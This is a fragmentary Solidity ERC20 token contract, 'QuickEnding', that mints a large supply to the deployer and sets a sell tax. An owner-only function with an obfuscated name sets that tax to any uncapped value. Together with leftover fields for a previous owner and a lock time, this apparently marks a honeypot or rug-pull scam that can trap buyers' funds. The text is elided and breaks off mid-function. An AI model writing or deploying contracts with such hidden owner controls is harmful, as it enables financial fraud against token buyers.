...
contract QuickEnding is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("DQE", "QuickEnding") {
        _mint(msg.sender, 32000000000);
        sellTax = 5;
        _owner = msg.sender;
    ...
    function add_fcIn9E(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
    
    function add_eLkROt() public {
